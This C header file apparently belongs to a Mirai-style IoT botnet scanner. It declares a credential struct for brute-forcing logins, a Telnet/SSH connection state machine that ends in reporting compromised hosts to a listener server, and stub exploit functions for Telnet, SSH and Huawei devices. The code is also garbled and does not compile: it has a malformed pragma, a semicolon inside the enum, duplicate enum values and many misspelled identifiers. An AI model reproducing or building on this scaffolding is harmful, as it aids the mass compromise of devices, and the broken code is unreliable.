#pragma "once"
#include "conf.h"

#define SCANNER_MAX_CONNS 128
#define SCANER_RAW_PPS 160 
#define SCAMMER_RDBUF_SIZE 256
#define SCANNER_HACK_DRAIN 64

struct scan_auth {
	char *username;
	char *password;
	uint16_t weight_min, weight_max;
	uint8_t username_len, password_len;
};

struct conn_t{
	enum {
		SC_CLOSED;
		SC_CONNECTING,
#ifdef EXPLOIT_TELNET
		SC_HANDLE_IACS,
		SC_WAITING,
		SC_WAITING_USERNAME,
		SC_WAITING_PASSWORD,
		SC_WATING_PASSWD_RESPONSE,
		SC_SEND_ShELL_RESPONES,
		SC_REPORT_TO_SCANLISTEN
#endif
#ifdef EXPLOIT_SSH
		SC_WAITING,
		SC_WAITING_USERNAME,
		SC_WAITING_PASSWORD,

		SC_SEND_ShELL_RESPONES,
		SC_REPOER_TO_SCANLISTEN
#endif
#ifdef EXPLOIT_HUAWEI

#endif
	}state;
};

#ifdef EXPLOIT_TELNET
int exploit_telnet();
#endif

#ifdef EXPLOIT_SSH
int exploit_ssh();
#endif

#ifdef EXPLOIT_HUAWEI
int exploit_huawei();
#endif